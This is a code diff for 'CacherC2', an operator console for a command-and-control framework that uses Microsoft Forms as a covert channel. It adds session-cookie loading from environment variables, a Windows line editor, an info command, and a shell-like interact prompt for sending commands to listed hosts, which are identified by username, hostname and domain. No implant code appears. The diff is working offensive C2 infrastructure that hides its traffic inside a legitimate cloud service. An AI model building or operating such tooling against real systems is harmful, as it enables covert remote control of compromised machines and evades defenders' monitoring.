@@ -7,6 +7,7 @@ import base64
 import json
 import os
 import re
+import socket
 import sys
 import threading
 import time
@@ -17,20 +18,36 @@ import uuid as uuid_mod
 from http.cookiejar import CookieJar
 from typing import Any, Iterable
 
-__version__ = "1.0.0"
-__author__ = "Vinicius Pereira (vnxdtzip)"
+try:
+    from dotenv import load_dotenv
+except ImportError:
+    load_dotenv = None
+
+try:
+    from dotenv import load_dotenv
+except ImportError:
+    load_dotenv = None
+
+# Try to import readline for better terminal handling (Unix/Linux/Mac)
+try:
+    import readline
+    HAS_READLINE = True
+except ImportError:
+    HAS_READLINE = False
 
 BANNER = r"""
- [92m                   _____                                            ________[0m
- [92m  _____   ______ _/ ____\___________  _____   ______           ____ \_____  \[0m
- [92m /     \ /  ___/ \   __\/  _ \_  __ \/     \ /  ___/  ______ _/ ___\ /  ____/[0m
- [92m|  Y Y  \\___ \   |  | (  <_> )  | \/  Y Y  \\___ \  /_____/ \  \___/       \[0m
- [92m|__|_|  /____  >  |__|  \____/|__|  |__|_|  /____  >          \___  >_______ \[0m
- [92m      \/     \/                           \/     \/               \/        \/[0m
+[37m  _______            __              [91m _______ _______ [0m
+[37m |   _   .---.-.----|  |--.-----.----[91m|   _   |       |[0m
+[37m |.  1___|  _  |  __|     |  -__|   _[91m|.  1___|___|   |[0m
+[37m |.  |___|___._|____|__|__|_____|__| [91m|.  |___ /  ___/ [0m
+[37m |:  1   |                           [91m|:  1   |:  1  \ [0m
+[37m |::.. . |                           [91m|::.. . |::.. . |[0m
+[37m `-------'                           [91m`-------`-------'[0m
 
- [97mMicrosoft Forms as a Command and Control (C2)[0m
+
+ [37mCacherC2::Microsoft Forms as a Command and Control ([91mC2[37m)[0m
  [94mby vnxdtzip[0m
-""".replace("[", "\033[").format(version=__version__, author=__author__)
+""".replace("[", "\033[")
 
 def print_banner() -> None:
     print(BANNER)
@@ -39,13 +56,11 @@ def print_banner() -> None:
 # collect the cookie again from DevTools (instructions at the top of this file).
 # The `OIDCAuth.forms/AADAuth.forms` cookie: the browsing session itself.
 
-OIDC_AUTH = (
-    ""
-)
+if load_dotenv:
+    load_dotenv()
 
-AAD_AUTH = (
-    ""
-)
+OIDC_AUTH = os.getenv("OIDC_AUTH", "").strip()
+AAD_AUTH = os.getenv("AAD_AUTH", "").strip()
 
 COOKIE = f"OIDCAuth.forms={OIDC_AUTH}; AADAuth.forms={AAD_AUTH}"
 
@@ -66,11 +81,11 @@ COLUMNS = [
 ]
 
 KEY_COLUMN = "UUID"
-VISIBLE_COLUMNS = [c for c in COLUMNS if c != "Response"]
+VISIBLE_COLUMNS = ["Username", "Hostname", "Domain", "UUID", "Last Seen"]
 VERTICAL_OUTPUT = False
 POLL_INTERVAL = 3.0
 LOG_PATH: str | None = None
-MAX_CELL_WIDTH = 20
+MAX_CELL_WIDTH = 40
 MIN_TERMINAL_WIDTH = 80
 
 UA = (
@@ -108,6 +123,195 @@ def clear_screen(use_ansi: bool) -> None:
         print("\033[H\033[J", end="")
     else:
         os.system("cls" if os.name == "nt" else "clear")
+
+
+class ConsoleIO:
+
+    def __init__(self, use_ansi: bool):
+        self.use_ansi = use_ansi
+        self._lock = threading.RLock()
+        self._reading = False
+        self._prompt = ""
+        self._buffer: list[str] = []
+        self._cursor = 0
+        self._history: list[str] = []
+        self._history_index = 0
+        self._windows_console = (
+            os.name == "nt" and sys.stdin.isatty() and sys.stdout.isatty()
+        )
+
+    def _clear_line(self) -> None:
+        if self.use_ansi:
+            sys.stdout.write("\r\033[2K")
+        else:
+            try:
+                import shutil
+
+                width = max(80, shutil.get_terminal_size().columns)
+            except Exception:
+                width = 120
+            sys.stdout.write("\r" + (" " * width) + "\r")
+
+    def _redraw_windows_line(self) -> None:
+        self._clear_line()
+        text = "".join(self._buffer)
+        sys.stdout.write(self._prompt + text)
+
+        chars_to_move_left = len(text) - self._cursor
+        if chars_to_move_left > 0:
+            if self.use_ansi:
+                sys.stdout.write(f"\033[{chars_to_move_left}D")
+            else:
+                sys.stdout.write("\b" * chars_to_move_left)
+        sys.stdout.flush()
+
+    def _finish_windows_input(self) -> str:
+        value = "".join(self._buffer)
+        if value and (not self._history or self._history[-1] != value):
+            self._history.append(value)
+
+        self._reading = False
+        self._prompt = ""
+        self._buffer = []
+        self._cursor = 0
+        self._history_index = len(self._history)
+        return value
+
+    def _windows_input(self, prompt: str) -> str:
+        import msvcrt
+
+        with self._lock:
+            self._reading = True
+            self._prompt = prompt
+            self._buffer = []
+            self._cursor = 0
+            self._history_index = len(self._history)
+            sys.stdout.write(prompt)
+            sys.stdout.flush()
+
+        while True:
+            ch = msvcrt.getwch()
+
+            if ch in ("\x00", "\xe0"):
+                special = msvcrt.getwch()
+                with self._lock:
+                    if special == "K" and self._cursor > 0:  # left
+                        self._cursor -= 1
+                    elif special == "M" and self._cursor < len(self._buffer):  # right
+                        self._cursor += 1
+                    elif special == "G":  # home
+                        self._cursor = 0
+                    elif special == "O":  # end
+                        self._cursor = len(self._buffer)
+                    elif special == "S" and self._cursor < len(self._buffer):  # delete
+                        del self._buffer[self._cursor]
+                    elif special == "H" and self._history:  # up
+                        if self._history_index > 0:
+                            self._history_index -= 1
+                        value = self._history[self._history_index]
+                        self._buffer = list(value)
+                        self._cursor = len(self._buffer)
+                    elif special == "P" and self._history:  # down
+                        if self._history_index < len(self._history) - 1:
+                            self._history_index += 1
+                            value = self._history[self._history_index]
+                        else:
+                            self._history_index = len(self._history)
+                            value = ""
+                        self._buffer = list(value)
+                        self._cursor = len(self._buffer)
+                    self._redraw_windows_line()
+                continue
+
+            with self._lock:
+                if ch in ("\r", "\n"):
+                    sys.stdout.write("\n")
+                    sys.stdout.flush()
+                    return self._finish_windows_input()
+
+                if ch == "\x03":  # Ctrl+C
+                    sys.stdout.write("^C\n")
+                    sys.stdout.flush()
+                    self._finish_windows_input()
+                    raise KeyboardInterrupt
+
+                if ch == "\x1a" and not self._buffer:  # Ctrl+Z
+                    sys.stdout.write("\n")
+                    sys.stdout.flush()
+                    self._finish_windows_input()
+                    raise EOFError
+
+                changed = False
+                if ch == "\x08":  # backspace
+                    if self._cursor > 0:
+                        self._cursor -= 1
+                        del self._buffer[self._cursor]
+                        changed = True
+                elif ch == "\x01":  # Ctrl+A
+                    self._cursor = 0
+                    changed = True
+                elif ch == "\x05":  # Ctrl+E
+                    self._cursor = len(self._buffer)
+                    changed = True
+                elif ch == "\x15":  # Ctrl+U
+                    self._buffer = []
+                    self._cursor = 0
+                    changed = True
+                elif ch == "\t":
+                    for char in "    ":
+                        self._buffer.insert(self._cursor, char)
+                        self._cursor += 1
+                    changed = True
+                elif ch.isprintable():
+                    self._buffer.insert(self._cursor, ch)
+                    self._cursor += 1
+                    changed = True
+
+                if changed:
+                    self._redraw_windows_line()
+
+    def input(self, prompt: str) -> str:
+        if self._windows_console:
+            return self._windows_input(prompt)
+
+        with self._lock:
+            self._reading = True
+            self._prompt = prompt
+
+        try:
+            return input(prompt)
+        finally:
+            with self._lock:
+                self._reading = False
+                self._prompt = ""
+
+    def notify(self, text: str) -> None:
+        """Print a monitor message and immediately restore the active prompt."""
+        with self._lock:
+            if self._windows_console and self._reading:
+                self._clear_line()
+                sys.stdout.write(text + "\n")
+                self._redraw_windows_line()
+                return
+
+            if HAS_READLINE and self._reading:
+                try:
+                    line_buffer = readline.get_line_buffer()
+                    self._clear_line()
+                    sys.stdout.write(text + "\n")
+                    sys.stdout.write(self._prompt + line_buffer)
+                    sys.stdout.flush()
+                    readline.redisplay()
+                    return
+                except Exception:
+                    pass
+
+            if self._reading:
+                self._clear_line()
+                sys.stdout.write(text + "\n" + self._prompt)
+                sys.stdout.flush()
+            else:
+                print(text, flush=True)
 
 
 def resolve_form_identity(form_id: str, opener: urllib.request.OpenerDirector) -> dict:
@@ -330,6 +534,18 @@ def get_responses(form: dict, cookie: str) -> list[dict]:
     return all_rows
 
 
+def format_submit_date(submit_date_str: str) -> str:
+    if not submit_date_str:
+        return ""
+    try:
+        from datetime import datetime, timedelta, timezone
+        dt = datetime.fromisoformat(submit_date_str.replace("Z", "+00:00"))
+        utc3 = timezone(timedelta(hours=-3))
+        dt = dt.astimezone(utc3)
+        return dt.strftime("%Y-%m-%d %H:%M:%S")
+    except Exception:
+        return submit_date_str
+
 def response_to_row(resp: dict, question_ids: list[str]) -> dict:
     try:
         answers = json.loads(resp.get("answers") or "[]")
@@ -341,7 +557,10 @@ def response_to_row(resp: dict, question_ids: list[str]) -> dict:
     row = {}
     for i, name in enumerate(COLUMNS):
         qid = question_ids[i] if i < len(question_ids) else None
-        row[name] = by_id.get(qid, "") if qid else ""
+        if name == "Last Seen":
+            row[name] = format_submit_date(resp.get("submitDate") or "")
+        else:
+            row[name] = by_id.get(qid, "") if qid else ""
 
     row["_id"] = resp.get("id")
     row["_submitDate"] = resp.get("submitDate") or ""
@@ -430,11 +649,12 @@ def render_vertical(rows: list[dict], visible: list[str] | None = None) -> str:
 class Monitor:
 
     def __init__(self, form: dict, cookie: str, question_ids: list[str],
-                 interval: float, log_path: str | None = None):
+                 interval: float, console: ConsoleIO, log_path: str | None = None):
         self.form = form
         self.cookie = cookie
         self.question_ids = question_ids
         self.interval = interval
+        self.console = console
         self.log_path = log_path
 
         self._lock = threading.Lock()
@@ -475,8 +695,7 @@ class Monitor:
 
     def _report(self, msg: str) -> None:
         stamp = time.strftime("%H:%M:%S")
-        # Leading \n so it does not stick to the prompt the user is typing at.
-        print(f"\n{stamp} {msg}", flush=True)
+        self.console.notify(f"{stamp} {msg}")
 
         if self.log_path:
             with open(self.log_path, "a", encoding="utf-8") as fh:
@@ -535,7 +754,7 @@ class Monitor:
         self._last_response = response
         byte_count = len(response.encode("utf-8"))
         shown = response if response else "(empty)"
-        self._report(f"\033[96m[<]\033[0m {self.focus}: {shown}  ({byte_count} bytes, id {latest['_id']})")
+        self._report(f"\033[96m[<]\033[0m {self.focus}: \033[32m{shown}\033[0m  ({byte_count} bytes, id {latest['_id']})")
 
     def focus_on(self, key: str) -> None:
         with self._lock:
@@ -579,6 +798,7 @@ class Monitor:
 
 HELP = """Commands:
   list            redraws the table with the latest state
+  info UUID       shows all information for a UUID in raw format
   all             lists all hosts, ungrouped (with Response and Id)
   interact UUID   opens the interaction prompt with that host
   delete UUID     deletes every of UUID, after confirmation
@@ -601,10 +821,10 @@ def delete_key(monitor: Monitor, writer: FormWriter, key: str) -> None:
         return
 
     ids = sorted(r["_id"] for r in rows if r["_id"] is not None)
-    print(f"\033[91m[!] About to delete\033[0m {len(ids)} response(s) from {key} (ids {ids}). This cannot be undone.")
+    print(f"\033[91m[!] About to delete host. This cannot be undone.")
 
     try:
-        answer = input("Confirm? [y/N] ").strip().lower()
+        answer = monitor.console.input("Confirm? [y/N] ").strip().lower()
     except EOFError:
         answer = ""
 
@@ -630,6 +850,19 @@ def delete_key(monitor: Monitor, writer: FormWriter, key: str) -> None:
         print(f"  \033[92m[*] {len(deleted)} response(s) deleted\033[0m from {key}.")
 
 
+def show_info(monitor: Monitor, key: str) -> None:
+    rows = monitor.rows_for(key)
+    if not rows:
+        print(f"\033[93m[!] No response from\033[0m '{key}' in the table.")
+        return
+
+    latest = max(rows, key=lambda r: (r["_submitDate"], r["_id"] or 0))
+    body = render_vertical([latest], visible=[c for c in COLUMNS if c != "Response"])
+    print(f"\n\033[96mInfo for UUID {key}\033[0m:\n")
+    print(body)
+    print()
+
+
 def interact_mode(monitor: Monitor, form: dict, writer: FormWriter, cookie: str, key: str) -> None:
 
     try:
@@ -645,7 +878,10 @@ def interact_mode(monitor: Monitor, form: dict, writer: FormWriter, cookie: str,
     try:
         while True:
             try:
-                message = input(f"[interact] {key} > ").strip().lstrip("﻿").strip()
+                hostname = socket.gethostname()
+                username = os.getenv("USERNAME", "user")
+                prompt = f"\033[91m{hostname}\\{username} $> \033[0m"
+                message = monitor.console.input(f"[interact] {key} {prompt}").strip().lstrip("﻿").strip()
             except EOFError:
                 return
 
@@ -658,6 +894,10 @@ def interact_mode(monitor: Monitor, form: dict, writer: FormWriter, cookie: str,
                 continue
             if message.lower() == "delete":
                 delete_key(monitor, writer, key)
+                # Exit interact mode if the host was deleted
+                if not monitor.rows_for(key):
+                    print(f"\033[93m[*] Host {key} has been deleted. Returning to main prompt.\033[0m")
+                    return
                 continue
 
             new_title = build_title(get_form_title(form, cookie), key, message)
@@ -681,11 +921,18 @@ def main(argv: list[str]) -> int:
     )
     ap.add_argument(
         "form_id",
-        help="Value of the `id=` query parameter of the form URL (not the full URL).",
+        nargs="?",
+        default=os.getenv("FORM_ID", ""),
+        help="Value of the `id=` query parameter of the form URL (not the full URL). Can also be set via FORM_ID env var.",
     )
     args = ap.parse_args(argv)
 
     print_banner()
+
+    if not args.form_id:
+        raise FormsError(
+            "form_id is required. Pass it as an argument or set the FORM_ID environment variable."
+        )
 
     # Both halves are checked here rather than left to come back as a 401, which says
     # nothing about which of the two is missing or malformed.
@@ -715,12 +962,14 @@ def main(argv: list[str]) -> int:
 
     if len(question_ids) != len(COLUMNS):
         print(
-            f"\033[93m⚠ Warning:\033[0m the form has {len(question_ids)} questions, but COLUMNS defines "
+            f"\033[93mWarning:\033[0m the form has {len(question_ids)} questions, but COLUMNS defines "
             f"{len(COLUMNS)} names. The leftovers stay empty or are ignored.",
             file=sys.stderr,
         )
 
-    monitor = Monitor(form, COOKIE, question_ids, POLL_INTERVAL, LOG_PATH)
+    use_ansi = enable_ansi()
+    console = ConsoleIO(use_ansi)
+    monitor = Monitor(form, COOKIE, question_ids, POLL_INTERVAL, console, LOG_PATH)
 
     # Shared by both prompts so the antiforgery pair is fetched once, not per command.
     writer = FormWriter(form, COOKIE)
@@ -770,15 +1019,13 @@ def main(argv: list[str]) -> int:
     thread = threading.Thread(target=monitor.run, daemon=True)
     thread.start()
 
-    use_ansi = enable_ansi()
-
     while True:
         if monitor.fatal_error:
             raise monitor.fatal_error
 
         try:
             # The BOM is stripped because PowerShell prepends one to stdin when
-            command = input("> ").strip().lstrip("﻿").strip().lower()
+            command = console.input("\033[91m>>\033[0m ").strip().lstrip("﻿").strip().lower()
         except EOFError:
             break
 
@@ -786,6 +1033,10 @@ def main(argv: list[str]) -> int:
             continue
         if command in ("list", "l", "ls"):
             draw()
+        elif command.startswith("info"):
+            target = resolve_target(command, "Usage: info <UUID>")
+            if target:
+                show_info(monitor, target)
         elif command.startswith("interact"):
             target = resolve_target(command, "Usage: interact <UUID>")
             if target:
